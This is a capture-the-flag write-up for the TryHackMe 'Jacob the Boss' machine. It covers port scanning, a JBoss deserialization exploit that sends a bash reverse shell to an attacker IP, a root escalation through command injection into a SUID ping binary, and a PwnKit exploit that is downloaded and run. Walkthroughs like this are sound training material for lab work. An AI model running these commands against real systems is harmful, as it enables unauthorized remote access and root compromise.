---
tags:
  - THM
  - Linux
  - Medium
  - Deserialization
  - RCE
  - SUID
  - File-Analysis
  - PwnKit
---
https://tryhackme.com/room/jacobtheboss/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.172.249 jacobtheboss.box
```
# Scanning
```console
$ nmap -p22,80,111,1090,1098,1099,3306,3873,4444,4445,4446,4457,4712,4713,8009,8080,8083,39007,45136,45630 -sV -sC jacobtheboss.box

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp  open  java-rmi     Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    b23e
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Welcome to JBoss&trade;
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
8083/tcp  open  http         JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
39007/tcp open  java-rmi     Java RMI
45136/tcp open  unknown
45630/tcp open  unknown
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.98%I=7%D=12/27%Time=69504969%P=x86_64-pc-linux-gnu%r(N
SF:ULL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xp\xb3\x1d\[\x10ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x
SF:02\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~
SF:\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server
SF:\.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\
SF:.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.serv
SF:er\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\
SF:0\x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\x8e\xbf\xefd\0\0\x01\x9
SF:ba\x9c3\]\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.98%I=7%D=12/27%Time=6950496F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.98%I=7%D=12/27%Time=6950496F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.98%I=7%D=12/27%Time=6950496F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.98%I=7%D=12/27%Time=6950496F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,5,"b23e\n")%r(GenericLines,5,"b23e\n")%r(GetRequest,5,"b23e\n")%r(H
SF:TTPOptions,5,"b23e\n")%r(RTSPRequest,5,"b23e\n")%r(RPCCheck,5,"b23e\n")
SF:%r(DNSVersionBindReqTCP,5,"b23e\n")%r(DNSStatusRequestTCP,5,"b23e\n")%r
SF:(Help,5,"b23e\n")%r(SSLSessionReq,5,"b23e\n")%r(TerminalServerCookie,5,
SF:"b23e\n")%r(TLSSessionReq,5,"b23e\n")%r(Kerberos,5,"b23e\n")%r(SMBProgN
SF:eg,5,"b23e\n")%r(X11Probe,5,"b23e\n")%r(FourOhFourRequest,5,"b23e\n")%r
SF:(LPDString,5,"b23e\n")%r(LDAPSearchReq,5,"b23e\n")%r(LDAPBindReq,5,"b23
SF:e\n")%r(SIPOptions,5,"b23e\n")%r(LANDesk-RC,5,"b23e\n")%r(TerminalServe
SF:r,5,"b23e\n")%r(NCP,5,"b23e\n")%r(NotesRPC,5,"b23e\n")%r(JavaRMI,5,"b23
SF:e\n")%r(WMSRequest,5,"b23e\n")%r(oracle-tns,5,"b23e\n")%r(ms-sql-s,5,"b
SF:23e\n")%r(afp,5,"b23e\n")%r(giop,5,"b23e\n");
Service Info: OS: Windows; Device: printer; CPE: cpe:/o:microsoft:windows
```
In summary, we have:
- SSH at port 22.
- Blog at port 80.
- Apache Tomcat at port 8080.
- Many Java serialization services.
# Enumeration
At port 8080, we can get the JBoss version at `/web-console/`:
```text
Version: 5.0.0.GA (build: SVNTag=JBoss_5_0_0_GA date=200812041721)
```
By doing some research, found that the current JBoss version is vulnerable to many Java Deserialization attacks like [CVE-2017-12149](https://github.com/jreppiks/CVE-2017-12149).
# Exploitation
Clone the exploitation repository:
```console
$ git clone https://github.com/pimps/ysoserial-modified

$ cd ysoserial-modified/target/
```
Wait for connections:
```console
$ nc -lvnp 4444
```
Create and send malicious serialized object:
```console
$ /usr/lib/jvm/java-11-openjdk/bin/java -jar ysoserial-modified.jar CommonsCollections1 bash 'bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"' > payload.ser

$ curl -s -X POST 'http://jacobtheboss.box:8080/invoker/readonly' --data-binary @payload.ser
```
Get the **user flag**:
```console
$ cat /home/jacob/user.txt
```
# Post-Exploitation
## Privilege Escalation
Found unusual `/usr/bin/pingsys` binary with **SUID permissions**:
```console
$ find / -perm -4000 2>/dev/null

/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```
The binary runs the `ping` command against a target specified by the user:
```console
$ strings /usr/bin/pingsys

...
ping -c 4 %s
...
```
Spawn a **root shell** by injecting a command, then get the **root flag**:
```console
$ /usr/bin/pingsys 'localhost; chmod u+s /bin/bash'

$ /bin/bash -p

# cat /root/root.txt
```
## PwnKit (alternative)
The `/usr/bin/pkexec` has **SUID permissions**, so first share the exploit in the local machine:
```console
$ git clone https://github.com/ly4k/PwnKit

$ cd PwnKit

$ python3 -m http.server 8000
```
Now, download and execute the exploit from the target machine:
```console
$ cd /tmp/

$ wget http://192.168.186.238:8000/PwnKit

$ chmod +x PwnKit

$ ./PwnKit

# whoami
root
```